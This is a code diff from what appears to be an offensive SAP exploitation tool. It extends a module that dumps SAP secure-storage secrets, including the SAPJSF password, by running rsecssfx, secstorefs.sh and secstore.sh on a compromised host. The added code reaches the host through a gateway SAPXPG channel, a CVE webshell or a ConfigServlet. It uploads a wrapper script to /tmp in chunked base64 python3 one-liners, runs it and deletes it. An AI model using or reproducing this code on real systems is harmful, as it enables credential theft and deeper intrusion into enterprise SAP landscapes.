@@ -53,27 +53,86 @@ logger = logging.getLogger(__name__)
 # template; caller supplies SID + instance-nr string.
 _CONFIGTOOL_DIR_TMPL = "/usr/sap/{sid}/{inst_dir}/j2ee/configtool"
 
-# Scripts we try (in order).  Each tuple is (script_name, args).  The
-# args are "safe-dump" invocations — they either print help (useful for
-# fingerprinting) or dump the secure-storage contents non-destructively.
-_DUMP_ATTEMPTS = [
-    # SecStoreFS file-side dumper.  -l lists all entries; -d includes
-    # values.  On many SP levels the ``<sid>adm`` OS identity alone is
-    # enough auth, no password prompt.
-    ("secstorefs.sh", "-l"),
-    ("secstorefs.sh", "-d"),
-    ("secstorefs.sh", "-print"),
-    # SecStore DB-side CLI (Vault-aware).  -dump emits a full properties
-    # file to stdout on 7.4+.
-    ("secstore.sh", "-h"),
-    ("secstore.sh", "-list"),
-    ("secstore.sh", "-dumpvalues"),
-    ("secstore.sh", "-dump"),
-    # offline configtool — prints the whole DB, takes master password
-    # as env var or command-line.  Large output expected.
-    ("configtool.sh", "-help"),
-    ("offlinecfgeditor.sh", "-help"),
+# Additional directories where SAP's secure-storage tooling lives.  These
+# are kernel binaries / SAP-Java-specific scripts, NOT inside configtool/.
+# Paths formatted with {sid} / {inst_dir}.
+_AUX_TOOL_DIRS = [
+    # rsecssfx = CommonCryptoLib SecStoreFS CLI, shipped in the kernel
+    # exe dir for the instance.
+    "/usr/sap/{sid}/{inst_dir}/exe",
+    "/usr/sap/{sid}/SYS/exe/run",
+    "/usr/sap/{sid}/SYS/exe/uc/linuxx86_64",
+    # SAP security tools dir — has secstorefs.sh and friends on 7.5+.
+    "/usr/sap/{sid}/SYS/global/security/lib/tools",
+    "/usr/sap/{sid}/{inst_dir}/j2ee/os_libs",
 ]
+
+# Scripts / binaries we try.  Each tuple is (name, args, needs_login_shell).
+# Tools with needs_login_shell=True get wrapped in `bash -lc` so the SAP
+# env (.sapenv_<host>.sh) is sourced before they run — without it,
+# configtool.sh fails with "Could not find or load main class
+# com.sap.engine.offline.OfflineToolStart".
+_DUMP_ATTEMPTS = [
+    # rsecssfx — the MOST important tool for our purpose.  Reads the
+    # on-disk SecStoreFS (and, critically, the Vault-backed secondary
+    # store where UMEBackendConnection's SAPJSF password lives).
+    ("rsecssfx", "list",             False),
+    ("rsecssfx", "list -s",          False),
+    ("rsecssfx", "list -plain",      False),
+    ("rsecssfx", "list -v",          False),
+    # SAP 7.5+ SecStoreFS shell wrapper
+    ("secstorefs.sh", "-l",          True),
+    ("secstorefs.sh", "-d",          True),
+    ("secstorefs.sh", "-print",      True),
+    # DB-side SecStore CLI (Vault-aware).  Often lives next to the
+    # configtool scripts on older kernels.
+    ("secstore.sh", "-h",            True),
+    ("secstore.sh", "-list",         True),
+    ("secstore.sh", "-dumpvalues",   True),
+    ("secstore.sh", "-dump",         True),
+    # Offline configtool — needs SAP env because it depends on the
+    # J2EE_CONFIG jars.  Useless without `-lc` wrapping.
+    ("configtool.sh", "-help",       True),
+    ("offlinecfgeditor.sh", "-help", True),
+    ("consoleconfig.sh", "-help",    True),
+]
+
+
+def _write_remote_file(run_cmd: Callable[[str, str], dict],
+                          path: str, content: str,
+                          log=print,
+                          chunk_size: int = 150) -> bool:
+    """Write a UTF-8 text file to the target via chunked python3
+    one-liners.  Reuses the exact pattern _deploy_jsp_via_gw uses so
+    it works through every run_cmd primitive (GW SAPXPG → CVE-31324
+    webshell → CTC ConfigServlet).
+
+    Returns True on success.  Each chunk's command stays ≤ 255 bytes
+    so it fits in SAPXPG's PARAMS field when that's the transport.
+    """
+    import base64
+    b64 = base64.b64encode(content.encode("utf-8")).decode("ascii")
+    n_chunks = (len(b64) + chunk_size - 1) // chunk_size
+    log(f"[*] configtool: uploading wrapper in {n_chunks} × "
+        f"{chunk_size}-byte base64 chunks …")
+    for i in range(0, len(b64), chunk_size):
+        chunk = b64[i:i + chunk_size]
+        mode = "wb" if i == 0 else "ab"
+        script = (f"open('{path}','{mode}').write("
+                   f"__import__('base64').b64decode(b'{chunk}'))")
+        r = run_cmd("python3", f"-c {script}")
+        if not r.get("success"):
+            log(f"[-] configtool: chunk {(i // chunk_size) + 1}/{n_chunks} "
+                f"write failed")
+            return False
+    # Sanity-check the file size matches what we encoded (raw bytes =
+    # decoded length).
+    st = run_cmd("/usr/bin/stat", f"-c %s {path}")
+    st_out = " ".join(str(l) for l in (st.get("output") or [])).strip()
+    log(f"[+] configtool: {path} size on target: "
+        f"{st_out or '<no stat>'} (expected {len(b64)} base64 B "
+        f"pre-decode, or ~{len(content)} final)")
+    return True
 
 
 def find_instance_directories(run_cmd: Callable[[str, str], dict],
@@ -156,58 +215,106 @@ def dump_configtool(sid: str,
 
     result["instances_tried"] = inst_dirs
 
-    all_output = []
+    # 2. Build one self-contained wrapper script that sources the SAP
+    # env and iterates every candidate directory + tool + arg combo.
+    # This sidesteps the SAPXPG `bash -lc` whitespace-split problem
+    # completely: we only need to launch the wrapper once, with no
+    # quoted args.  Output is bounded with `head -500` per tool so
+    # hitting an accidentally-recursive dumper doesn't OOM us.
+    def _expand(tmpl, d):
+        return tmpl.format(sid=sid, inst_dir=d)
 
-    # 2. For each instance dir, walk the script attempts.
+    cfg_dirs = []
     for d in inst_dirs:
-        cfg_dir = _CONFIGTOOL_DIR_TMPL.format(sid=sid, inst_dir=d)
-        log(f"[*] configtool: trying {cfg_dir} …")
+        cfg_dirs.append(_CONFIGTOOL_DIR_TMPL.format(sid=sid, inst_dir=d))
+        for tmpl in _AUX_TOOL_DIRS:
+            cfg_dirs.append(_expand(tmpl, d))
+    cfg_dirs_sh = " ".join(f'"{d}"' for d in cfg_dirs)
 
-        # Probe whether the configtool dir exists on this instance
-        probe = run_cmd("/bin/ls", f"-la {cfg_dir}")
-        probe_out = " ".join(str(l) for l in (probe.get("output") or []))
-        if (not probe.get("success")
-                or "No such" in probe_out or "cannot access" in probe_out):
-            log(f"[*] configtool: {cfg_dir} not present, skipping")
-            continue
-        log(f"[+] configtool: {cfg_dir} exists, contents:")
-        for line in (probe.get("output") or [])[:30]:
-            log(f"[*]   {line}")
+    wrapper = f"""#!/bin/bash
+# SAPMAP ConfigTool wrapper.  Sources SAP env, iterates candidate
+# directories x tools x args, prints output delimited so the Python
+# parser can split by '=== ... ===' markers.
+for f in /home/*/.sapenv_*.sh /home/*/.sapenv.sh; do
+  [ -f "$f" ] && . "$f" 2>/dev/null
+done
+[ -x /usr/sap/{sid}/SYS/exe/run/sapcontrol ] && \\
+  export PATH=/usr/sap/{sid}/SYS/exe/run:$PATH
+invoke() {{
+  local script=$1 ; shift
+  local args=$@
+  for d in {cfg_dirs_sh}; do
+    local p="$d/$script"
+    if [ -x "$p" ]; then
+      echo "=== $p $args ==="
+      "$p" $args 2>&1 | head -500
+      echo
+    fi
+  done
+}}
+"""
+    # Append invoke calls (name + args) for each tool attempt
+    for script, args, _ in attempts:
+        wrapper += f'invoke "{script}" {args}\n'
 
-        # Try each known dump-capable script
-        for script, args in attempts:
-            script_path = f"{cfg_dir}/{script}"
-            # First confirm the script is actually present
-            ls = run_cmd("/bin/ls", script_path)
-            ls_out = " ".join(str(l) for l in (ls.get("output") or []))
-            if "No such" in ls_out or not ls.get("success"):
-                continue
+    log(f"[*] configtool: writing /tmp/sapmap_ct.sh ({len(wrapper)} B) "
+        f"to target via chunked python3 …")
+    if not _write_remote_file(run_cmd, "/tmp/sapmap_ct.sh",
+                                wrapper, log=log):
+        result["error"] = ("could not write wrapper script to /tmp "
+                           "— python3 unreachable or /tmp not writable")
+        log(f"[-] configtool: {result['error']}")
+        return result
 
-            log(f"[*] configtool: running {script_path} {args} …")
-            # Run via /bin/sh -c so we can append '2>&1' and capture stderr.
-            # The caller's run_cmd already handles the sh-vs-cmd dispatch,
-            # but we explicitly chain so combined output comes back.
-            cmd_line = (f"'{script_path}' {args} 2>&1")
-            r = run_cmd("/bin/sh", f"-c {cmd_line}")
-            out_lines = r.get("output") or []
-            snippet = "\n".join(str(l) for l in out_lines)
-            if not snippet.strip():
-                log(f"[*] configtool: {script} {args} produced no output")
-                continue
+    # chmod +x
+    run_cmd("python3", "-c __import__('os').chmod('/tmp/sapmap_ct.sh',0o755)")
 
-            log(f"[+] configtool: {script} {args} returned "
-                f"{len(snippet)} bytes; first 10 lines:")
-            for line in out_lines[:10]:
-                log(f"[*]   {line}")
-            if len(out_lines) > 10:
-                log(f"[*]   … ({len(out_lines) - 10} more lines)")
+    # Execute the wrapper.  One round-trip.
+    log(f"[*] configtool: running /tmp/sapmap_ct.sh …")
+    r = run_cmd("/tmp/sapmap_ct.sh", "")
+    out_lines = r.get("output") or []
+    dump = "\n".join(str(l) for l in out_lines)
+    log(f"[+] configtool: wrapper returned {len(dump)} bytes in "
+        f"{len(out_lines)} lines")
 
-            all_output.append(f"=== {script_path} {args} ===\n{snippet}\n")
+    # Cleanup
+    run_cmd("/bin/rm", "-f /tmp/sapmap_ct.sh")
+
+    # Parse the dump into per-tool blocks for the results structure
+    all_output = []
+    cur_cmd = None
+    buf = []
+    for line in out_lines:
+        s = str(line)
+        if s.startswith("=== ") and s.endswith(" ==="):
+            if cur_cmd and buf:
+                snippet = "\n".join(buf).strip()
+                if snippet:
+                    all_output.append(f"=== {cur_cmd} ===\n{snippet}\n")
+                    result["successful_commands"].append({
+                        "dir": cur_cmd.rsplit("/", 1)[0] if "/" in cur_cmd
+                                else "",
+                        "script": cur_cmd.split()[0].rsplit("/", 1)[-1]
+                                    if cur_cmd else "",
+                        "args": " ".join(cur_cmd.split()[1:])
+                                    if cur_cmd else "",
+                        "bytes": len(snippet),
+                        "snippet": snippet[:500],
+                    })
+            cur_cmd = s[4:-4].strip()
+            buf = []
+        else:
+            buf.append(s)
+    if cur_cmd and buf:
+        snippet = "\n".join(buf).strip()
+        if snippet:
+            all_output.append(f"=== {cur_cmd} ===\n{snippet}\n")
             result["successful_commands"].append({
-                "dir":     cfg_dir,
-                "script":  script,
-                "args":    args,
-                "bytes":   len(snippet),
+                "dir": cur_cmd.rsplit("/", 1)[0] if "/" in cur_cmd else "",
+                "script": cur_cmd.split()[0].rsplit("/", 1)[-1]
+                            if cur_cmd else "",
+                "args": " ".join(cur_cmd.split()[1:]) if cur_cmd else "",
+                "bytes": len(snippet),
                 "snippet": snippet[:500],
             })
 
